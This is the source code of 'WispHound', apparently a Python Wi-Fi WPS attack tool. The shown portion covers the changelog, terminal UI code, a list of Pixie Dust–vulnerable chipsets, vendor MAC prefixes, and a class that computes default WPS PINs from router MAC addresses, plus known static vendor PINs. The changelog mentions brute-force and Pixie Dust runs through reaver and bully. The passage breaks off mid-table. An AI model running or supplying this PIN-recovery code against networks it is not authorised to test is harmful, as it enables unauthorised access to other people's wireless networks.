#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WispHound 2.2.1 — WPS reconnaissance, Pixie Dust prioritization & multi-backend auditor.

2.2.1 fix:
  * [FIX] UI.tag(): 'run' badge used bad kwarg `l=` -> positional label. tag() is
          now lazy so a single bad entry can't break every message.
  * [FIX] die() path on ifaceUp() no longer crashes while formatting the error.

Changes vs 2.1.3 (all additive; existing CLI/flags/DB/reports keep working):
  * [FIX] checksum() is O(1) (no 10M-entry table; 300-800x faster startup, -10MB)
  * [FIX] wpa_supplicant stdout drained by reader thread (was read(300), ate M1/M2)
  * [FIX] per-attempt reset of last_m_message / nack_count
  * [FIX] reaver Pixie Dust no longer passes -N
  * [FIX] bully delay uses -d (µs), not -l (lockout wait)
  * [FIX] iw security regex uses \\s+ (WPA2 was mislabeled WEP)
  * [FIX] 6 GHz channel math: (freq-5955)//20 + 1
  * [FIX] WPS stored as bool; version kept separately
  * [FIX] _extract_essid survives apostrophes / non-Latin-1 SSIDs
  * [FIX] getSuggested dedupes; blind 12345670 default removed
  * [FIX] brute-force progress uses 10000/1000 denominators
  * [FIX] monitor mode verified or aborts; teardown only if vif changed
  * [FIX] Ctrl-C kills process groups (no orphan reaver/bully/pixiewps)
  * [FIX] --json: tables -> stderr, JSON -> stdout
  * [NEW] --pixie-timeout / --attack-timeout (split); --timeout alias kept
  * [NEW] --save-capture / --offline (replay Pixie Dust from transcript, no root)
  * [NEW] --dry-run, --authorized <file>, --lockout-budget N, --unsafe
  * [NEW] --tables-to-stdout (legacy --json behaviour)
  * [NEW] targets.db migration: lockout_until, pixie_capture, last_channel
  * [NEW] per-BSSID persisted lockout backoff
"""
import argparse
import codecs
import collections
import csv
import json
import os
import pathlib
import queue
import re
import shutil
import signal
import socket
import sqlite3
import statistics
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, Optional

try:
    import wcwidth
except ImportError:
    class _WC:
        @staticmethod
        def wcswidth(s):
            return len(s)
    wcwidth = _WC()


# ===========================================================================
# DESIGN SYSTEM
# ===========================================================================
class UI:
    RESET = '\033[0m'; BOLD = '\033[1m'; DIM = '\033[2m'
    BLACK = '\033[30m'; RED = '\033[91m'; GREEN = '\033[92m'
    YELLOW = '\033[93m'; BLUE = '\033[94m'; MAGENTA = '\033[95m'
    CYAN = '\033[96m'; WHITE = '\033[97m'; GREY = '\033[90m'
    BG_RED = '\033[41m'; BG_GREEN = '\033[42m'; BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'; BG_MAGENTA = '\033[45m'; BG_CYAN = '\033[46m'

    _enabled = None

    @classmethod
    def enabled(cls):
        if cls._enabled is None:
            cls._enabled = (hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
                            and os.environ.get('NO_COLOR', '') == '')
        return cls._enabled

    @classmethod
    def c(cls, text, *styles):
        if not cls.enabled() or not styles:
            return str(text)
        return ''.join(styles) + str(text) + cls.RESET

    @classmethod
    def ok(cls, t):     return cls.c(t, cls.GREEN)
    @classmethod
    def err(cls, t):    return cls.c(t, cls.RED)
    @classmethod
    def warn(cls, t):   return cls.c(t, cls.YELLOW)
    @classmethod
    def info(cls, t):   return cls.c(t, cls.CYAN)
    @classmethod
    def muted(cls, t):  return cls.c(t, cls.GREY)
    @classmethod
    def hi(cls, t):     return cls.c(t, cls.BOLD, cls.WHITE)
    @classmethod
    def accent(cls, t): return cls.c(t, cls.MAGENTA)
    @classmethod
    def head(cls, t):   return cls.c(t, cls.BOLD, cls.CYAN)

    @classmethod
    def badge(cls, label, fg=None, bg=None):
        fg = fg or cls.WHITE; bg = bg or ''
        inner = f' {label} '
        if not cls.enabled():
            return f'[{label}]'
        return f'{bg}{fg}{cls.BOLD}{inner}{cls.RESET}'

    @classmethod
    def badge_ok(cls, l):     return cls.badge(l, cls.BLACK, cls.BG_GREEN)
    @classmethod
    def badge_err(cls, l):    return cls.badge(l, cls.WHITE, cls.BG_RED)
    @classmethod
    def badge_warn(cls, l):   return cls.badge(l, cls.BLACK, cls.BG_YELLOW)
    @classmethod
    def badge_info(cls, l):   return cls.badge(l, cls.WHITE, cls.BG_BLUE)
    @classmethod
    def badge_cyan(cls, l):   return cls.badge(l, cls.BLACK, cls.BG_CYAN)
    @classmethod
    def badge_grey(cls, l):   return cls.c(f'[{l}]', cls.GREY)

    @classmethod
    def tag(cls, kind):
        # Lazy: only build the requested badge. A typo in one branch
        # can never take down every other message.
        if kind == 'ok':   return cls.badge_ok('OK')
        if kind == 'err':  return cls.badge_err('ERR')
        if kind == 'warn': return cls.badge_warn('WARN')
        if kind == 'info': return cls.badge_info('INFO')
        if kind == 'dbg':  return cls.badge_grey('DBG')
        if kind == 'scan': return cls.badge_cyan('SCAN')
        if kind == 'run':  return cls.badge('RUN', fg=cls.WHITE, bg=cls.BG_MAGENTA)
        return ''

    @classmethod
    def msg(cls, kind, text):
        return f'{cls.tag(kind)} {text}'

    @classmethod
    def banner(cls, subtitle=''):
        art = r"""
 __      __.__               ___ ___                    .___
/  \    /  \__| ____________ /   |   \  ____  __ __  __| _/
\   \/\/   /  |/  ___/\____ \/    ~    \/  _ \|  |  \/ __ |
 \        /|  |\___ \ /  |_> >    Y    (  <_> )  |  / /_/ |
  \__/\  / |__/____  >|   __/ \___|_  / \____/|____/\____ |
       \/          \/ |__|         \/                   \/
"""
        out = [cls.c(ln, cls.BOLD, cls.CYAN)
               for ln in art.strip('\n').splitlines()]
        out.append('')
        out.append('  ' + cls.c(f'WispHound {VERSION}', cls.BOLD, cls.WHITE)
                   + cls.muted('  —  ' + (subtitle or 'WPS recon & Pixie Dust auditor')))
        return '\n'.join(out)

    @classmethod
    def table(cls, headers, rows, aligns=None, max_widths=None, title=None):
        def vlen(s):
            return wcwidth.wcswidth(re.sub(r'\033\[[0-9;]*m', '', str(s)))

        def vtrunc(s, limit):
            plain = re.sub(r'\033\[[0-9;]*m', '', str(s))
            if limit is None or wcwidth.wcswidth(plain) <= limit:
                return str(s)
            out, cur = [], 0
            for ch in plain:
                w = wcwidth.wcswidth(ch)
                if cur + w > max(0, limit - 1):
                    break
                out.append(ch); cur += w
            return ''.join(out) + '…'

        aligns = aligns or ['l'] * len(headers)
        rows = [[vtrunc(c, max_widths[i] if max_widths else None)
                 for i, c in enumerate(r)] for r in rows]
        widths = [vlen(h) for h in headers]
        for r in rows:
            for i, c in enumerate(r):
                widths[i] = max(widths[i], vlen(c))

        def pad(s, w, a):
            gap = w - vlen(s)
            if gap <= 0: return s
            if a == 'r': return ' ' * gap + s
            if a == 'c':
                l = gap // 2; return ' ' * l + s + ' ' * (gap - l)
            return s + ' ' * gap

        TL, TR, BL, BR, H, V = '┌', '┐', '└', '┘', '─', '│'
        TM, BM, LM, RM, MM = '┬', '┴', '├', '┤', '┼'

        def rule(l, m, r):
            return l + m.join(H * (w + 2) for w in widths) + r

        def line(cells, a=aligns):
            return V + V.join(' ' + pad(cells[i], widths[i], a[i]) + ' '
                              for i in range(len(cells))) + V

        out = []
        if title: out.append(cls.head(title))
        out.append(cls.muted(rule(TL, TM, TR)))
        out.append(cls.head(line([cls.hi(h) for h in headers])))
        out.append(cls.muted(rule(LM, MM, RM)))
        for r in rows: out.append(line(r))
        out.append(cls.muted(rule(BL, BM, BR)))
        return '\n'.join(out)

    @classmethod
    def spinner(cls, label, interval=0.1):
        frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        class _S:
            def __init__(self): self._stop = False; self._t = None
            def __enter__(self):
                if not cls.enabled():
                    print(f'[*] {label}…', file=sys.stderr); return self
                def run():
                    i = 0
                    while not self._stop:
                        sys.stderr.write('\r' + cls.c(frames[i % len(frames)], cls.MAGENTA)
                                         + f' {label}…'); sys.stderr.flush()
                        i += 1; time.sleep(interval)
                    sys.stderr.write('\r' + ' ' * (len(label) + 10) + '\r')
                    sys.stderr.flush()
                self._t = threading.Thread(target=run, daemon=True)
                self._t.start(); return self
            def __exit__(self, *a):
                self._stop = True
                if self._t: self._t.join(timeout=1)
                return False
        return _S()

    @classmethod
    def section(cls, title):
        return f'\n{cls.head(title)}\n{cls.muted("─" * max(10, min(60, len(title) + 4)))}'


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
VERSION = '2.2.1'

BACKEND_INTERNAL = 'internal'
BACKEND_REAVER = 'reaver'
BACKEND_BULLY = 'bully'
BACKENDS = (BACKEND_INTERNAL, BACKEND_REAVER, BACKEND_BULLY)


def _homedir():
    return str(pathlib.Path.home())


_REPORTS_DIR_CACHE = None


def pick_reports_dir(force_refresh=False):
    global _REPORTS_DIR_CACHE
    if _REPORTS_DIR_CACHE and not force_refresh:
        return _REPORTS_DIR_CACHE
    for d in (
        os.path.join(_homedir(), '.WispHound', 'reports'),
        os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports'),
        os.path.join(tempfile.gettempdir(), 'wisphound-reports'),
    ):
        try:
            os.makedirs(d, exist_ok=True)
            p = os.path.join(d, '.write_test')
            with open(p, 'w', encoding='utf-8') as f: f.write('ok')
            os.remove(p)
            _REPORTS_DIR_CACHE = d
            return d
        except OSError:
            continue
    _REPORTS_DIR_CACHE = os.path.join(tempfile.gettempdir(), 'wisphound-reports')
    return _REPORTS_DIR_CACHE


def _captures_dir():
    d = os.path.join(_homedir(), '.WispHound', 'captures')
    try: os.makedirs(d, exist_ok=True)
    except OSError: pass
    return d


def _safe_makedirs(d):
    try: os.makedirs(d, exist_ok=True); return True
    except OSError as e:
        print(UI.msg('err', f'Cannot create {d}: {e}'), file=sys.stderr); return False


# ------- graceful exit: kill process groups, no orphans --------------------
_CHILD_PROCS = set()
_CHILD_LOCK = threading.Lock()


def _register_child(proc):
    with _CHILD_LOCK: _CHILD_PROCS.add(proc)


def _unregister_child(proc):
    with _CHILD_LOCK:
        _CHILD_PROCS.discard(proc)


def _kill_children():
    with _CHILD_LOCK:
        procs = list(_CHILD_PROCS)
        _CHILD_PROCS.clear()
    for p in procs:
        try:
            if os.name == 'posix':
                try: os.killpg(os.getpgid(p.pid), signal.SIGTERM)
                except Exception:
                    try: p.terminate()
                    except Exception: pass
            else:
                p.terminate()
            try: p.wait(timeout=2)
            except Exception:
                try: p.kill()
                except Exception: pass
        except Exception:
            pass


def _graceful_exit_handler(signum, frame):
    _kill_children()
    raise KeyboardInterrupt


for _sig in ('SIGTERM', 'SIGHUP', 'SIGINT'):
    if hasattr(signal, _sig):
        try: signal.signal(getattr(signal, _sig), _graceful_exit_handler)
        except (ValueError, OSError): pass


def run_proc(argv, timeout=None, **kwargs):
    """subprocess.run replacement that registers the child for kill-on-exit."""
    if os.name == 'posix':
        kwargs.setdefault('start_new_session', True)
    p = subprocess.Popen(argv, **kwargs)
    _register_child(p)
    try:
        out, _ = p.communicate(timeout=timeout)
        return p.returncode, out
    except subprocess.TimeoutExpired:
        _kill_children()
        raise
    finally:
        _unregister_child(p)


# ---------------------------------------------------------------------------
# OUI + chipsets
# ---------------------------------------------------------------------------
PIXIE_VULNERABLE_CHIPSETS = {
    'RT2860': 'Ralink RT2860', 'RT2870': 'Ralink RT2870',
    'RT3050': 'Ralink RT3050', 'RT3052': 'Ralink RT3052',
    'RT3070': 'Ralink RT3070', 'RT3090': 'Ralink RT3090',
    'RT3290': 'Ralink RT3290', 'RT3352': 'Ralink RT3352',
    'RT3572': 'Ralink RT3572', 'RT5350': 'Ralink RT5350',
    'RT5370': 'Ralink RT5370', 'RT5372': 'Ralink RT5372',
    'RT5390': 'Ralink RT5390', 'RT5592': 'Ralink RT5592',
    'MT7601': 'MediaTek MT7601', 'MT7603': 'MediaTek MT7603',
    'MT7610': 'MediaTek MT7610', 'MT7612': 'MediaTek MT7612',
    'MT7615': 'MediaTek MT7615', 'MT7620': 'MediaTek MT7620',
    'MT7628': 'MediaTek MT7628', 'MT7688': 'MediaTek MT7688',
    'RTL8186': 'Realtek RTL8186', 'RTL8188': 'Realtek RTL8188',
    'RTL8192': 'Realtek RTL8192', 'RTL8196': 'Realtek RTL8196',
    'RTL8197': 'Realtek RTL8197', 'RTL8723': 'Realtek RTL8723',
    'RTL8811': 'Realtek RTL8811', 'RTL8812': 'Realtek RTL8812',
    'RTL8814': 'Realtek RTL8814', 'RTL8821': 'Realtek RTL8821',
    'RTL8822': 'Realtek RTL8822',
    'BCM4312': 'Broadcom BCM4312', 'BCM4313': 'Broadcom BCM4313',
    'BCM4318': 'Broadcom BCM4318', 'BCM4321': 'Broadcom BCM4321',
    'BCM4322': 'Broadcom BCM4322', 'BCM4325': 'Broadcom BCM4325',
    'BCM4329': 'Broadcom BCM4329', 'BCM4331': 'Broadcom BCM4331',
    'BCM4352': 'Broadcom BCM4352', 'BCM4360': 'Broadcom BCM4360',
    'BCM43142': 'Broadcom BCM43142', 'BCM43224': 'Broadcom BCM43224',
    'BCM43225': 'Broadcom BCM43225', 'BCM43227': 'Broadcom BCM43227',
    'BCM43228': 'Broadcom BCM43228',
    'AR7240': 'Atheros AR7240', 'AR7241': 'Atheros AR7241',
    'AR7242': 'Atheros AR7242', 'AR9220': 'Atheros AR9220',
    'AR9271': 'Atheros AR9271', 'AR9280': 'Atheros AR9280',
    'AR9281': 'Atheros AR9281', 'AR9283': 'Atheros AR9283',
    'AR9285': 'Atheros AR9285', 'AR9287': 'Atheros AR9287',
    'AR9331': 'Atheros AR9331', 'AR9340': 'Atheros AR9340',
    'AR9341': 'Atheros AR9341', 'AR9342': 'Atheros AR9342',
    'AR9344': 'Atheros AR9344', 'AR9382': 'Atheros AR9382',
    'AR9462': 'Atheros AR9462', 'AR9485': 'Atheros AR9485',
    'AR9550': 'Atheros AR9550', 'AR9580': 'Atheros AR9580',
    'QCA9533': 'Qualcomm QCA9533', 'QCA9550': 'Qualcomm QCA9550',
    'QCA9558': 'Qualcomm QCA9558', 'QCA9563': 'Qualcomm QCA9563',
    'QCA9880': 'Qualcomm QCA9880', 'QCA9882': 'Qualcomm QCA9882',
    'QCA9890': 'Qualcomm QCA9890',
    '88W8363': 'Marvell 88W8363', '88W8366': 'Marvell 88W8366',
    '88W8764': 'Marvell 88W8764', '88W8864': 'Marvell 88W8864',
    '88W8897': 'Marvell 88W8897',
    'PSB6970': 'Lantiq PSB6970', 'PEB6024': 'Lantiq PEB6024',
    'XWAY': 'Lantiq XWAY', 'GRX300': 'Lantiq GRX300',
    'ZD1211': 'ZyDAS ZD1211', 'ZD1211B': 'ZyDAS ZD1211B',
    'CX82310': 'Conexant CX82310',
    'CL1800': 'Celeno CL1800', 'CL1900': 'Celeno CL1900',
}

OUI_BUILTIN = {
    '0014D1': 'TRENDnet', '00904C': 'Epigram/Broadcom',
    'D4BF7F': 'Upvel', 'F8C091': 'Upvel',
    '0026CE': 'Onlime', '00664B': 'Huawei', '0023F8': 'Zyxel',
    'C83A35': 'Tenda', '001CDF': 'Belkin', '002275': 'Belkin',
    '5C353B': 'Compal (CBN)', 'DC537C': 'Compal (CBN)',
    '0018E7': 'Cameo', '001AA9': 'Fujitsu',
    '200BC7': 'Ralink/MediaTek', '4846FB': 'Ralink/MediaTek',
    'D46AA8': 'Ralink/MediaTek', 'F84ABF': 'Ralink/MediaTek',
    '00E04C': 'Realtek', '00E04B': 'Realtek',
    '10BEF5': 'D-Link', 'CCB255': 'D-Link', '1C7EE5': 'D-Link',
    '28107B': 'D-Link', '84C9B2': 'D-Link', 'B8A386': 'D-Link',
    'FC7516': 'D-Link', 'A0AB1B': 'D-Link', '14D64D': 'D-Link',
    'C0A0BB': 'D-Link', '5CD998': 'D-Link', '340804': 'D-Link',
    '9094E4': 'TP-Link', 'EC086B': 'TP-Link', '1062EB': 'TP-Link',
    '1C5F2B': 'TP-Link', '802689': 'TP-Link', '908D78': 'TP-Link',
    'E8CC18': 'TP-Link', 'D8FEE3': 'TP-Link',
    '50465D': 'ASUSTek', '10BF48': 'ASUSTek', '049226': 'ASUSTek',
    '04D9F5': 'ASUSTek', '08606E': 'ASUSTek', '2CFDA1': 'ASUSTek',
    '107B44': 'ASUSTek', '10C37B': 'ASUSTek', '1CB72C': 'ASUSTek',
    '382C4A': 'ASUSTek', '40167E': 'ASUSTek', '90F652': 'ASUSTek',
    'AC9E17': 'ASUSTek', 'BCEE7B': 'ASUSTek', '60A44C': 'ASUSTek',
    '704D7B': 'ASUSTek', '7824AF': 'ASUSTek', 'D017C2': 'ASUSTek',
    '1C872C': 'ASUSTek', '2C56DC': 'ASUSTek', 'C86000': 'ASUSTek',
    '788102': 'Sercomm', '7894B4': 'Sercomm',
    '0022B0': 'D-Link', '001CF0': 'D-Link',
    'C8BE19': 'TP-Link', 'C8D3A3': 'TP-Link',
    '7C034C': 'Netgear', '204E7F': 'Netgear', '4C17EB': 'Netgear',
    '18622C': 'Netgear', '7C03D8': 'Netgear', 'D86CE9': 'Netgear',
    'A01B29': 'Netgear', 'E0469A': 'Netgear',
    '9CD643': 'D-Link', '68A0F6': 'D-Link',
    '0C96BF': 'Huawei', '20F3A3': 'Huawei', 'ACE215': 'Huawei',
    'C8D15E': 'Huawei', 'E8CD2D': 'Huawei', 'F80113': 'Huawei',
    '087A4C': 'Huawei', '14B968': 'Huawei', '2008ED': 'Huawei',
    '346BD3': 'Huawei', '786A89': 'Huawei', '88E3AB': 'Huawei',
    '7071BC': 'Cisco', 'E06995': 'Cisco', '001A2B': 'Cisco',
    '00248C': 'Cisco', '002618': 'Cisco', '344DEB': 'Cisco',
    'EC6264': 'Broadcom', '988B5D': 'Broadcom', '14144B': 'Broadcom',
    'BCF685': 'Broadcom', '002624': 'Thomson', '4432C8': 'Thomson',
    '88F7C7': 'Thomson', 'CC03FA': 'Thomson',
    '4C09B4': 'ZTE', '4CAC0A': 'ZTE', '9CD24B': 'ZTE',
    'DC028E': 'ZTE', 'FCC897': 'ZTE', 'B075D5': 'ZTE',
    'C864C7': 'ZTE', '84742A': 'ZTE',
    '784476': 'Upvel', '08C6B3': 'Realtek', '007263': 'Realtek',
}


# ---------------------------------------------------------------------------
# NetworkAddress
# ---------------------------------------------------------------------------
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, NetworkAddress):
            self._int_repr = mac._int_repr; self._str_repr = mac._str_repr
        elif isinstance(mac, int):
            self._int_repr = mac; self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(self._str_repr)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self): return self._str_repr
    @string.setter
    def string(self, v): self._str_repr = v; self._int_repr = self._mac2int(v)
    @property
    def integer(self): return self._int_repr
    @integer.setter
    def integer(self, v): self._int_repr = v; self._str_repr = self._int2mac(v)
    def __int__(self): return self.integer
    def __str__(self): return self.string
    def __iadd__(self, o): self.integer = self.integer + int(o); return self
    def __isub__(self, o): self.integer = self.integer - int(o); return self
    def _coerce(self, o):
        if isinstance(o, NetworkAddress): return o.integer
        try: return NetworkAddress(o).integer
        except (ValueError, AttributeError): return NotImplemented
    def __eq__(self, o):
        v = self._coerce(o); return NotImplemented if v is NotImplemented else self.integer == v
    def __ne__(self, o):
        v = self._coerce(o); return NotImplemented if v is NotImplemented else self.integer != v
    def __lt__(self, o): return self.integer < self._coerce(o)
    def __gt__(self, o): return self.integer > self._coerce(o)
    def __hash__(self): return hash(self._int_repr)
    @staticmethod
    def _mac2int(mac): return int(mac.replace(':', ''), 16)
    @staticmethod
    def _int2mac(mac):
        s = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(s[i:i+2] for i in range(0, 12, 2))
    def __repr__(self):
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'


# ---------------------------------------------------------------------------
# WPSpin — O(1) checksum, deduped suggestions
# ---------------------------------------------------------------------------
class WPSpin:
    ALGO_MAC = 0; ALGO_EMPTY = 1; ALGO_STATIC = 2

    def __init__(self):
        self._pin_cache = {}
        self.algos = {
            'pin24':        {'name': '24-bit PIN',      'mode': self.ALGO_MAC,    'gen': self.pin24},
            'pin28':        {'name': '28-bit PIN',      'mode': self.ALGO_MAC,    'gen': self.pin28},
            'pin32':        {'name': '32-bit PIN',      'mode': self.ALGO_MAC,    'gen': self.pin32},
            'pinDLink':     {'name': 'D-Link PIN',      'mode': self.ALGO_MAC,    'gen': self.pinDLink},
            'pinDLink1':    {'name': 'D-Link PIN +1',   'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
            'pinASUS':      {'name': 'ASUS PIN',        'mode': self.ALGO_MAC,    'gen': self.pinASUS},
            'pinAirocon':   {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
            'pinInvNIC':    {'name': 'Inverted NIC',    'mode': self.ALGO_MAC,    'gen': self.pinInvNIC},
            'pinNIC2':      {'name': 'NIC x2',          'mode': self.ALGO_MAC,    'gen': self.pinNIC2},
            'pinNIC3':      {'name': 'NIC x3',          'mode': self.ALGO_MAC,    'gen': self.pinNIC3},
            'pinOUIaddNIC': {'name': 'OUI+NIC sum',     'mode': self.ALGO_MAC,    'gen': self.pinOUIaddNIC},
            'pinOUIxorNIC': {'name': 'OUI^NIC xor',     'mode': self.ALGO_MAC,    'gen': self.pinOUIxorNIC},
            'pinEmpty':     {'name': 'Empty PIN',       'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
            'pinCisco':     {'name': 'Cisco',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1':     {'name': 'Broadcom 1',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2':     {'name': 'Broadcom 2',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3':     {'name': 'Broadcom 3',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4':     {'name': 'Broadcom 4',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5':     {'name': 'Broadcom 5',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6':     {'name': 'Broadcom 6',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1':     {'name': 'Airocon 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2':     {'name': 'Airocon 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R':  {'name': 'DSL-2740R',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1':  {'name': 'Realtek 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2':  {'name': 'Realtek 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3':  {'name': 'Realtek 3',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel':     {'name': 'Upvel',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC':   {'name': 'UR-814AC',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC':   {'name': 'UR-825AC',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime':    {'name': 'Onlime',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax':    {'name': 'Edimax',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson':   {'name': 'Thomson',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x':    {'name': 'HG532x',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L':     {'name': 'H108L',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO':       {'name': 'CBN ONO',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
            'pinTenda':     {'name': 'Tenda',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 1296051},
            'pinTPLink1':   {'name': 'TP-Link 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinTPLink2':   {'name': 'TP-Link 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 5765498},
            'pinNetgear1':  {'name': 'Netgear 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinNetgear2':  {'name': 'Netgear 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinZTE1':      {'name': 'ZTE 1',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinZTE2':      {'name': 'ZTE 2',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
        }

    @staticmethod
    def checksum(pin):
        try: pin = int(pin)
        except (TypeError, ValueError): return 0
        accum = 0
        while pin:
            accum += 3 * (pin % 10); pin //= 10
            accum += pin % 10;       pin //= 10
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        key = (algo, str(mac))
        if key in self._pin_cache: return self._pin_cache[key]
        mac = mac if isinstance(mac, NetworkAddress) else NetworkAddress(mac)
        if algo not in self.algos: raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            result = pin
        else:
            pin %= 10000000
            result = (str(pin) + str(self.checksum(pin))).zfill(8)
        self._pin_cache[key] = result
        return result

    def getAll(self, mac, get_static=True):
        return [{'id': ID,
                 'name': ('Static PIN — ' if a['mode'] == self.ALGO_STATIC else '') + a['name'],
                 'pin': self.generate(ID, mac)}
                for ID, a in self.algos.items()
                if get_static or a['mode'] != self.ALGO_STATIC]

    def getList(self, mac, get_static=True):
        return [self.generate(ID, mac) for ID, a in self.algos.items()
                if get_static or a['mode'] != self.ALGO_STATIC]

    def getSuggested(self, mac):
        seen, out = set(), []
        for ID in self._suggest(mac):
            a = self.algos[ID]
            prefix = 'Static PIN — ' if a['mode'] == self.ALGO_STATIC else ''
            pin = self.generate(ID, mac)
            if pin in seen: continue
            seen.add(pin)
            out.append({'id': ID, 'name': prefix + a['name'], 'pin': pin})
        return out

    def getSuggestedUnique(self, mac): return self.getSuggested(mac)
    def getSuggestedList(self, mac):   return [i['pin'] for i in self.getSuggested(mac)]
    def getLikely(self, mac):
        r = self.getSuggestedList(mac); return r[0] if r else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        return [aid for aid, masks in _SUGGEST_MAP.items()
                if any(mac.startswith(m) for m in masks)]

    # --- per-algorithm math ---
    def pin24(self, mac): return mac.integer & 0xFFFFFF
    def pin28(self, mac): return mac.integer & 0xFFFFFFF
    def pin32(self, mac): return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) + ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(1e6)
        if pin < int(1e5):
            pin += ((pin % 9) * int(1e5)) + int(1e5)
        return pin

    def pinDLink1(self, mac):
        m = NetworkAddress(mac); m.integer += 1; return self.pinDLink(m)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        digits = []
        for i in range(7):
            denom = (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7)
            if denom == 0: denom = 10
            digits.append(str((b[i % 6] + b[5]) % denom))
        return int(''.join(digits))

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        return (((b[0] + b[1]) % 10) +
                (((b[5] + b[0]) % 10) * 10) +
                (((b[4] + b[5]) % 10) * 100) +
                (((b[3] + b[4]) % 10) * 1000) +
                (((b[2] + b[3]) % 10) * 10000) +
                (((b[1] + b[2]) % 10) * 100000) +
                (((b[0] + b[1]) % 10) * 1000000))

    def pinInvNIC(self, mac):
        return (~(mac.integer & 0xFFFFFF)) & 0xFFFFFF
    def pinNIC2(self, mac): return ((mac.integer & 0xFFFFFF) * 2) & 0xFFFFFF
    def pinNIC3(self, mac): return ((mac.integer & 0xFFFFFF) * 3) & 0xFFFFFF
    def pinOUIaddNIC(self, mac):
        return (((mac.integer >> 24) & 0xFFFFFF) + (mac.integer & 0xFFFFFF)) & 0xFFFFFF
    def pinOUIxorNIC(self, mac):
        return ((mac.integer >> 24) & 0xFFFFFF) ^ (mac.integer & 0xFFFFFF)


_SUGGEST_MAP = {
    'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D